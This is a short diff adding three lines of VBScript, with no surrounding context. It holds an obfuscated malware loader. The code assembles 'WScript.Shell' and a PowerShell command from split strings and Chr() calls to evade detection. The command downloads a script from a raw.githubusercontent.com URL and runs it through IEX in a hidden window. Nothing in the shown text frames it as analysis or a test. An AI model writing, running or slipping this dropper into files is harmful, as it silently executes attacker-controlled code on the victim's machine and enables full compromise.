@@ -1,0 +1,3 @@
+Set s = CreateObject("W" & Chr(83) & "cript.Shell")
+cmd = "pow" & "ershell IEX(iwr 'ht" & "tps://" & "raw.githubusercontent.com/31721/1/refs/heads/main/pl-st2' -UseBasicParsing).Content"
+s.Run cmd, 0, False
